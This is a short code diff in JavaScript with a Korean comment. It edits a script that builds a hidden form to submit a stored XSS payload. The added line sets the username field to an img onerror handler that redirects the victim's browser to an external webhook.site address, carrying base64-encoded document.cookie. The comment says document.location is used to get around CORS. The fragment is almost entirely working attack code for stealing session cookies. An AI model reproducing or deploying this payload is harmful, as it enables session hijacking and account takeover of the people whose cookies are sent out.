@@ -16,7 +16,7 @@
         usernameInput.name = 'username';
         
         // 수정된 페이로드: CORS를 우회하기 위해 fetch() 대신 document.location을 사용
-        usernameInput.value = '<img src=x onerror="document.location=\'' + webhookUrl + '?data=\' + btoa(document.cookie)">';
+        usernameInput.value = '<img src=x onerror="document.location='https://webhook.site/37bdbd68-15e2-4abe-8c35-33e87e040b14?data=' + btoa(document.cookie)" />';
         
         const passwordInput = document.createElement('input');
         passwordInput.type = 'hidden';
